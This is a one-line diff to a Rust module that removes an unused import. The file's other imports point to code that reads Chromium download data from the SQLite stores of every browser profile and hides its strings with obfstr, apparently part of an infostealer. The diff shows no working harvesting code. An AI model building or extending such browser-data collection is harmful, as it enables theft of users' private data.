@@ -2,7 +2,6 @@ use crate::chromium::BrowserData;
 use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Download};
 use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
-use alloc::vec::Vec;
 use database::TableRecord;
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
